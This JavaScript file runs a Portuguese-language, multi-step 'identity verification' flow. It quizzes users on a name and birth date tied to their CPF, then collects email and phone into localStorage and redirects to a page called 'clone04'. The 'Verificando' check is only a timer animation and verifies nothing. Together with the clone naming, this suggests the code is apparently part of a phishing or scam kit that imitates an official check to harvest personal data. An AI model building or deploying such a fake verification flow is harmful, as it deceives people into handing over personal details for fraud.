document.addEventListener('DOMContentLoaded', function() {
    if (!document.querySelector('.verify-step')) return;
    var getStoredNome = window.getStoredNome;
    var steps = document.querySelectorAll('.verify-step');
    var btnConfirmar = document.getElementById('btn-confirmar');
    var emailInput = document.getElementById('email-input');
    var emailError = document.getElementById('email-error');
    var telefoneInput = document.getElementById('telefone-input');
    var telefoneError = document.getElementById('telefone-error');
    var currentStep = 1;

    function shuffleArray(arr) {
        var a = arr.slice();
        for (var i = a.length - 1; i > 0; i--) {
            var j = Math.floor(Math.random() * (i + 1));
            var t = a[i]; a[i] = a[j]; a[j] = t;
        }
        return a;
    }
    function randomDate() {
        var d = 1 + Math.floor(Math.random() * 28);
        var m = 1 + Math.floor(Math.random() * 12);
        var y = 1960 + Math.floor(Math.random() * 50);
        return (d < 10 ? '0' : '') + d + '/' + (m < 10 ? '0' : '') + m + '/' + y;
    }
    function formatarNome(str) {
        if (!str || typeof str !== 'string') return '';
        var lower = ['da', 'de', 'do', 'dos', 'das', 'e'];
        return str.trim().toLowerCase().split(/\s+/).map(function(palavra, i) {
            if (i > 0 && lower.indexOf(palavra) !== -1) return palavra;
            return palavra.charAt(0).toUpperCase() + palavra.slice(1);
        }).join(' ');
    }

    var userData = null;
    try { userData = JSON.parse(localStorage.getItem('user_data') || 'null'); } catch (e) {}
    var loginNome = getStoredNome();
    var distratoresNomes = ['Pedro Ferreira Ribeiro', 'Helena Santos Marques', 'Carlos Eduardo Silva', 'João Santos Pinto', 'Ana Paula Oliveira', 'Roberto Lima Costa'];
    var distratoresMae = ['Maria Helena Souza', 'Clara Ferreira Marques', 'Laura Rodrigues Martins', 'Helena Ferreira Rocha', 'Antônia Silva Santos', 'Rita de Cássia Oliveira'];

    var step1Container = document.getElementById('step-options-1');
    var step2Container = document.getElementById('step-options-2');
    var quizErrorEls = [document.getElementById('quiz-error'), document.getElementById('quiz-error-2')];

    if (userData && step1Container && step2Container) {
        var nomeCerto = (userData.NOME || userData.nome || loginNome || '').trim();
        var nascCerto = (userData.NASC || userData.nasc || '').trim();

        if (nomeCerto) {
            var nomesOpcoes = [nomeCerto].concat(distratoresNomes.filter(function(n) { return n !== nomeCerto; }).slice(0, 3));
            var step1 = document.querySelector('.verify-step[data-step="1"]');
            if (step1) step1.setAttribute('data-correct', nomeCerto);
            shuffleArray(nomesOpcoes).forEach(function(n) {
                var label = document.createElement('label');
                label.className = 'option-item';
                label.innerHTML = '<input type="radio" name="nome" value="' + n.replace(/"/g, '&quot;') + '"><span class="option-text">' + n + '</span>';
                step1Container.appendChild(label);
            });
        }
        if (nascCerto) {
            var nascOpcoes = [nascCerto];
            for (var i = 0; i < 3; i++) {
                var rd = randomDate();
                if (rd !== nascCerto && nascOpcoes.indexOf(rd) === -1) nascOpcoes.push(rd);
            }
            while (nascOpcoes.length < 4) { var r = randomDate(); if (nascOpcoes.indexOf(r) === -1) nascOpcoes.push(r); }
            var step2 = document.querySelector('.verify-step[data-step="2"]');
            if (step2) step2.setAttribute('data-correct', nascCerto);
            shuffleArray(nascOpcoes).forEach(function(d) {
                var label = document.createElement('label');
                label.className = 'option-item';
                label.innerHTML = '<input type="radio" name="nascimento" value="' + d.replace(/"/g, '&quot;') + '"><span class="option-text">' + d + '</span>';
                step2Container.appendChild(label);
            });
        }
    } else if (step1Container) {
        var step1 = document.querySelector('.verify-step[data-step="1"]');
        var step2 = document.querySelector('.verify-step[data-step="2"]');
        if (step1) step1.setAttribute('data-input-mode', 'true');
        if (step2) step2.setAttribute('data-input-mode', 'true');
        step1Container.innerHTML = '<div class="step-input"><input type="text" id="nome-completo-input" class="email-input" placeholder="Digite seu nome completo" autocomplete="name"><span class="input-error" id="nome-error"></span></div>';
        if (step2Container) step2Container.innerHTML = '<div class="step-input"><input type="text" id="nascimento-input" class="email-input" placeholder="Ex: 01/01/1990" autocomplete="off" maxlength="10"><span class="input-error" id="nascimento-error"></span></div>';
        var nomeInput = document.getElementById('nome-completo-input');
        var nascimentoInput = document.getElementById('nascimento-input');
        if (nomeInput) nomeInput.addEventListener('input', function() { var el = getQuizErrorEl(1); if (el) el.textContent = ''; this.classList.remove('error'); });
        if (nascimentoInput) {
            nascimentoInput.addEventListener('input', function() {
                var v = this.value.replace(/\D/g, '');
                if (v.length <= 2) this.value = v;
                else if (v.length <= 4) this.value = v.slice(0, 2) + '/' + v.slice(2);
                else this.value = v.slice(0, 2) + '/' + v.slice(2, 4) + '/' + v.slice(4, 8);
                var el = getQuizErrorEl(2); if (el) el.textContent = ''; this.classList.remove('error');
            });
        }
    }

    function getQuizErrorEl(stepNum) { return quizErrorEls[stepNum - 1] || null; }
    function clearQuizErrors() { quizErrorEls.forEach(function(el) { if (el) el.textContent = ''; }); }

    function showStep(n) {
        steps.forEach(function(s) { s.classList.remove('active'); if (parseInt(s.dataset.step, 10) === n) s.classList.add('active'); });
        currentStep = n;
        var card = document.querySelector('.verify-card');
        if (card) card.scrollIntoView({ behavior: 'smooth', block: 'start' });
        if (emailError) emailError.textContent = '';
        if (emailInput) emailInput.classList.remove('error');
        if (telefoneError) telefoneError.textContent = '';
        if (telefoneInput) telefoneInput.classList.remove('error');
        clearQuizErrors();
    }
    function getCurrentStepData() {
        if (currentStep === 5) return { type: 'email', value: emailInput && emailInput.value.trim() || '' };
        if (currentStep === 6) return { type: 'telefone', value: telefoneInput && telefoneInput.value.trim() || '' };
        var stepEl = document.querySelector('.verify-step[data-step="' + currentStep + '"]');
        if (stepEl && stepEl.getAttribute('data-input-mode') === 'true') {
            var nomeInp = document.getElementById('nome-completo-input');
            var nascInp = document.getElementById('nascimento-input');
            if (currentStep === 1 && nomeInp) return { type: 'option', value: nomeInp.value.trim() };
            if (currentStep === 2 && nascInp) return { type: 'option', value: nascInp.value.trim() };
        }
        var sel = document.querySelector('.verify-step[data-step="' + currentStep + '"] input:checked');
        return sel ? { type: 'option', value: sel.value } : null;
    }
    function validateStep() {
        if (currentStep >= 1 && currentStep <= 2) {
            var stepEl = document.querySelector('.verify-step[data-step="' + currentStep + '"]');
            var isInputMode = stepEl && stepEl.getAttribute('data-input-mode') === 'true';
            if (isInputMode) {
                var data = getCurrentStepData();
                var err = getQuizErrorEl(currentStep);
                if (currentStep === 1) {
                    var nomeVal = (data && data.value) ? data.value.trim() : '';
                    if (nomeVal.length < 2) {
                        if (err) err.textContent = 'Digite seu nome completo para continuar.';
                        var nomeInp = document.getElementById('nome-completo-input');
                        if (nomeInp) nomeInp.classList.add('error');
                        return false;
                    }
                    if (err) err.textContent = '';
                    if (document.getElementById('nome-completo-input')) document.getElementById('nome-completo-input').classList.remove('error');
                }
                if (currentStep === 2) {
                    var nascVal = (data && data.value) ? data.value.trim() : '';
                    if (nascVal.length < 10) {
                        if (err) err.textContent = 'Digite sua data de nascimento (DD/MM/AAAA).';
                        var nascInp = document.getElementById('nascimento-input');
                        if (nascInp) nascInp.classList.add('error');
                        return false;
                    }
                    if (err) err.textContent = '';
                    if (document.getElementById('nascimento-input')) document.getElementById('nascimento-input').classList.remove('error');
                }
                clearQuizErrors();
                return true;
            }
            var correct = stepEl ? stepEl.getAttribute('data-correct') : null;
            var data = getCurrentStepData();
            if (!data || !data.value) {
                var err = getQuizErrorEl(currentStep);
                if (err) err.textContent = 'Selecione uma opção para continuar.';
                return false;
            }
            if (correct !== null && data.value !== correct) {
                var errEl = getQuizErrorEl(currentStep);
                if (errEl) errEl.textContent = 'Resposta incorreta. Confirme os dados do seu CPF e tente novamente.';
                return false;
            }
            clearQuizErrors();
            return true;
        }
        if (currentStep === 5) {
            var em = emailInput && emailInput.value.trim();
            if (!em || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) {
                if (emailError) emailError.textContent = 'Informe um e-mail válido.';
                if (emailInput) emailInput.classList.add('error');
                return false;
            }
            return true;
        }
        if (currentStep === 6) {
            var raw = telefoneInput && telefoneInput.value.replace(/\D/g, '') || '';
            if (raw.length !== 11 || raw.charAt(2) !== '9') {
                if (telefoneError) telefoneError.textContent = 'Informe um telefone válido. Ex: (11) 99999-9999';
                if (telefoneInput) telefoneInput.classList.add('error');
                return false;
            }
            if (telefoneError) telefoneError.textContent = '';
            if (telefoneInput) telefoneInput.classList.remove('error');
            return true;
        }
        if (!getCurrentStepData()) return false;
        return true;
    }
    showStep(1);
    if (telefoneInput) {
        telefoneInput.addEventListener('input', function() {
            var v = this.value.replace(/\D/g, '').substring(0, 11);
            if (v.length <= 2) {
                this.value = v ? '(' + v : '';
            } else if (v.length <= 7) {
                this.value = '(' + v.slice(0, 2) + ') ' + v.slice(2);
            } else {
                this.value = '(' + v.slice(0, 2) + ') ' + v.slice(2, 7) + '-' + v.slice(7, 11);
            }
            if (telefoneError) telefoneError.textContent = '';
            this.classList.remove('error');
        });
    }
    steps.forEach(function(s) {
        s.querySelectorAll('input[type="radio"]').forEach(function(radio) {
            radio.addEventListener('change', function() {
                clearQuizErrors();
            });
        });
    });
    if (btnConfirmar) btnConfirmar.addEventListener('click', function() {
        if (!validateStep()) return;
        var btn = btnConfirmar;
        var isLastStep = currentStep === 6;
        btn.disabled = true;
        btn.classList.add('verifying');
        btn.querySelector('.btn-confirmar-content').innerHTML = '<span class="btn-verificando-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span><span class="btn-verificando-text">Verificando</span>';
        setTimeout(function() {
            btn.classList.remove('verifying');
            btn.classList.add('verified');
            btn.querySelector('.btn-confirmar-content').innerHTML = '<i class="fas fa-check btn-confirmar-icon"></i> Verificado';
            setTimeout(function() {
                btn.classList.remove('verified');
                btn.disabled = false;
                btn.querySelector('.btn-confirmar-content').textContent = 'Confirmar';
                if (currentStep === 1) {
                    var nomeInp = document.getElementById('nome-completo-input');
                    if (nomeInp && nomeInp.value.trim()) {
                        var nome = formatarNome(nomeInp.value.trim());
                        try { localStorage.setItem('login_nome', nome); sessionStorage.setItem('login_nome', nome); } catch (e) {}
                        if (window.setUserNameInHeader) window.setUserNameInHeader();
                    }
                }
                if (currentStep === 2) {
                    var nascInp = document.getElementById('nascimento-input');
                    if (nascInp && nascInp.value.trim()) {
                        try {
                            var ud = JSON.parse(localStorage.getItem('user_data') || '{}');
                            ud.NASC = ud.nasc = nascInp.value.trim();
                            localStorage.setItem('user_data', JSON.stringify(ud));
                        } catch (e) {}
                    }
                }
                if (currentStep === 5 && emailInput) {
                    try { localStorage.setItem('cadastro_email', emailInput.value.trim()); } catch (e) {}
                }
                if (currentStep === 6 && telefoneInput) {
                    try { localStorage.setItem('cadastro_telefone', telefoneInput.value.trim()); } catch (e) {}
                }
                if (isLastStep) {
                    window.location.href = '../clone04/index.html' + (window.location.search || '');
                } else {
                    showStep(currentStep + 1);
                }
            }, 800);
        }, 1500);
    });

    if (document.querySelector('.verify-card') && !document.getElementById('chat-messages')) {
        window.iniciarProcesso = function(name) {
            window.location.href = '../chat/?estado=' + encodeURIComponent(name);
        };
    }
});
